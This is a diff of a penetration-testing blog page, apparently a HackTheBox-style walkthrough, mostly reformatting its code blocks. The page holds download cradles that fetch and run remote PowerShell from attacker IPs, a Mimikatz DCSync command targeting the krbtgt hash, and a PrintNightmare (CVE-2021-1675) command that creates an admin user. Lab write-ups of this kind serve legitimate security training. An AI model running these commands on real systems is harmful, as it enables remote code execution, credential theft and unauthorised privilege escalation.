@@ -207,7 +207,6 @@ function Invoke-SecureDownloadCradle {
 #### Example usage without logging: {#example-usage-without-logging}
 
 ```powershell
-
 #Import Script
 . .\Invoke-SecureDownloadCradle.ps1
 
@@ -221,7 +220,6 @@ Invoke-SecureDownloadCradle -Url "http://[IP]/[SCRIPT].ps1" -Verbose
 #### Example usage with logging: {#example-usage-with-logging}
 
 ```powershell
-
 #Import Script
 . .\Invoke-SecureDownloadCradle.ps1
 
@@ -269,9 +267,9 @@ iex(new-object net.webclient).downloadstring('http://10.10.14.46:9000/AdConnectP
 #### Setting Up the Environment {#setting-up-the-environment}
 
 1.  Start a Python HTTP server to host the Mimikatz script:
-    ```bash
-       python3 -m http.server 9000
-    ```
+```bash
+python3 -m http.server 9000
+```
 
 
 #### Loading Mimikatz into Memory {#loading-mimikatz-into-memory}
@@ -303,34 +301,32 @@ Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:krbtgt /doma
 
 -   +Full Walkthrough+: <https://bloodstiller.com/walkthroughs/driver-box/> Coming soon (it's still in release arena. )
 
--   **Start python server to host the script**:
-    ```bash
-       python3 -m http.server 9000
-    ```
 
-    -   {{< figure src="/ox-hugo/2024-11-11-135448_.png" >}}
-    -   +Note+: I have this command aliased to `pws`
+#### 1. Start python server to host the script:
 
--   **Use the download cradle to load the POC directly into memory**:
-    ```powershell
-      iex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/CVE-2021-1675.ps1')
-    ```
+```bash
+python3 -m http.server 9000
+```
+{{< figure src="/ox-hugo/2024-11-11-135448_.png" >}}
+-   +Note+: I have this command aliased to `pws`
 
-    -   {{< figure src="/ox-hugo/2024-11-11-135533_.png" >}}
+#### 2. Use the download cradle to load the POC directly into memory:
+```powershell
+iex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/CVE-2021-1675.ps1')
+```
+{{< figure src="/ox-hugo/2024-11-11-135533_.png" >}}
 
--   **Execute the script from memory to create new user &amp; add them to the admins**:
-    ```powershell
-      Invoke-Nightmare -NewUser "bloodstiller" -NewPassword "bl00dst1ll3r!" -DriverName "PrintIt"
-    ```
+#### 3. Execute the script from memory to create new user &amp; add them to the admins:
+```powershell
+  Invoke-Nightmare -NewUser "bloodstiller" -NewPassword "bl00dst1ll3r!" -DriverName "PrintIt"
+```
+{{< figure src="/ox-hugo/2024-11-11-135700_.png" >}}
 
-    -   {{< figure src="/ox-hugo/2024-11-11-135700_.png" >}}
-
--   **Verify the user has been added**:
-    ```powershell
-      net user bloodstiller
-    ```
-
-    -   {{< figure src="/ox-hugo/2024-11-11-135721_.png" >}}
+#### 4. Verify the user has been added:
+```powershell
+net user bloodstiller
+```
+{{< figure src="/ox-hugo/2024-11-11-135721_.png" >}}
 
 
 ## Security Considerations {#security-considerations}
